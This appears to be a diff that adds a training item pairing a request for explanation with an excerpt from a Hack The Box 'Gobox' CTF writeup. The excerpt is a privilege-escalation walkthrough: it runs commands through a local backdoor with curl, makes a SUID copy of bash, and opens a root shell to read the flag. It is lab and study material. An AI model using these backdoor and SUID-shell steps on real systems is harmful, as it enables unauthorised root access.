@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Provide a clear, comprehensive explanation of the following content: (Context: Writeup from Htb Gobox Hacks Stuff)
+
+CONTEXT:
+Source: Htb Gobox Hacks Stuff
+Section: Writeup
+
+METHOD / ANSWER:
+I can do it myself: www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[ls%20%2froot]' iptables.sh snap To get shell, I’ll copy Bash into tmp : www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[cp%20%2fbin%2fbash%20%2ftmp]' curl: (52) Empty reply from server www-data@gobox:~$ ls -l /tmp/bash -rwxr-xr-x 1 root root 1183448 Aug 26 19:38 /tmp/bash Now chmod to set it as SUID: www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[chmod%204777%20%2ftmp%2fbash]' curl: (52) Empty reply from server www-data@gobox:~$ ls -l /tmp/bash -rwsrwxrwx 1 root root 1183448 Aug 26 19:38 /tmp/bash Notice the s as the forth letter there. Running it with -p will preserve privilege: www-data@gobox:~$ /tmp/bash -p bash-5.0# And I can get the last flag: bash-5.0# cat /root/root.txt 81d35170************************
